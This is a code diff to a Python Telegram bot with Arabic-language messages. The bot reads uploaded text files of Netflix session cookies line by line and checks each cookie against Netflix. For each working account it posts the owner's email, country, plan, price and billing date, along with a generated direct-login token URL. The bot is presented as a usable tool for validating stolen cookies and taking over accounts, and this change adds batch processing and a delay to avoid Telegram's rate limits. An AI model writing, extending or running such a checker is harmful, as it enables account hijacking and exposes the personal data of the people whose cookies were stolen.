@@ -394,7 +394,7 @@ def send_welcome(message):
 def handle_documents(message):
     temp_dirs = []
     try:
-        bot.reply_to(message, "⏳ جاري تحميل الملف وفحصه...")
+        bot.reply_to(message, "⏳ جاري تحميل الملف وفحص الحسابات سطراً بسطر...")
         file_info = bot.get_file(message.document.file_id)
         downloaded_file = bot.download_file(file_info.file_path)
         
@@ -416,37 +416,47 @@ def handle_documents(message):
             bot.reply_to(message, "❌ لم يتم العثور على ملفات نصية صالحة.")
             return
             
+        valid_count = 0
         for txt_file in txt_files_to_check:
             try:
+                # قراءة الملف سطراً بسطر لمعالجة كل كوكي بمفرده
                 with open(txt_file, 'r', encoding='utf-8', errors='ignore') as f:
-                    content = f.read()
+                    lines = f.readlines()
                 
-                netflix_id = extract_netflix_id(content)
-                if not netflix_id:
-                    continue
-                    
-                account_info = check_netflix_cookie({"NetflixId": netflix_id})
-                if account_info["ok"]:
-                    token_result = generate_token(netflix_id)
-                    
-                    res_msg = "🎬 *TÀI KHOẢN NETFLIX HỢP LỆ* 🎬\n\n"
-                    res_msg += f"📋 *الملف:* `{os.path.basename(txt_file)}`\n"
-                    res_msg += f"🌍 *البلد:* `{account_info['country']}`\n"
-                    res_msg += f"📦 *الباقة:* `{account_info['plan']}`\n"
-                    res_msg += f"💰 *السعر:* `{account_info['plan_price']}`\n"
-                    res_msg += f"📅 *التجديد:* `{account_info['next_billing']}`\n"
-                    res_msg += f"👥 *الملفات الشخصية:* `{account_info['profiles']}`\n"
-                    res_msg += f"📧 *البريد:* `{account_info['email']}`\n"
-                    
-                    if token_result.get('status') == 'Success':
-                        mobile_url = f"https://netflix.com/unsupported?nftoken={token_result['token']}"
-                        res_msg += f"\n📱 *رابط الدخول المباشر:*\n`{mobile_url}`"
+                for line in lines:
+                    line = line.strip()
+                    if not line:
+                        continue
                         
-                    bot.send_message(message.chat.id, res_msg, parse_mode='Markdown')
+                    netflix_id = extract_netflix_id(line)
+                    if not netflix_id:
+                        continue
+                        
+                    account_info = check_netflix_cookie({"NetflixId": netflix_id})
+                    if account_info["ok"]:
+                        valid_count += 1
+                        token_result = generate_token(netflix_id)
+                        
+                        res_msg = "🎬 *حساب NETFLIX صالح وفعال* 🎬\n\n"
+                        res_msg += f"🌍 *البلد:* `{account_info['country']}`\n"
+                        res_msg += f"📦 *الباقة:* `{account_info['plan']}`\n"
+                        res_msg += f"💰 *السعر:* `{account_info['plan_price']}`\n"
+                        res_msg += f"📅 *التجديد:* `{account_info['next_billing']}`\n"
+                        res_msg += f"👥 *الملفات:* `{account_info['profiles']}`\n"
+                        res_msg += f"📧 *البريد:* `{account_info['email']}`\n"
+                        
+                        if token_result.get('status') == 'Success':
+                            mobile_url = token_result.get('direct_login_url', f"https://netflix.com/unsupported?nftoken={token_result['token']}")
+                            res_msg += f"\n📱 *رابط الدخول المباشر:*\n`{mobile_url}`"
+                        else:
+                            res_msg += f"\n⚠️ *تنبيه:* لم يتم توليد التوكن بنجاح."
+                            
+                        bot.send_message(message.chat.id, res_msg, parse_mode='Markdown')
+                        time.sleep(1) # توقف قصير لتفادي حظر تليجرام
             except Exception as e:
-                logger.error(f"Error processing file: {e}")
+                logger.error(f"Error processing line/file: {e}")
                 
-        bot.reply_to(message, "✅ انتهى فحص الملفات.")
+        bot.reply_to(message, f"✅ انتهى الفحص. تم العثور على وإرسال ({valid_count}) حساب شغال.")
     except Exception as e:
         bot.reply_to(message, f"❌ حدث خطأ: {str(e)}")
     finally:
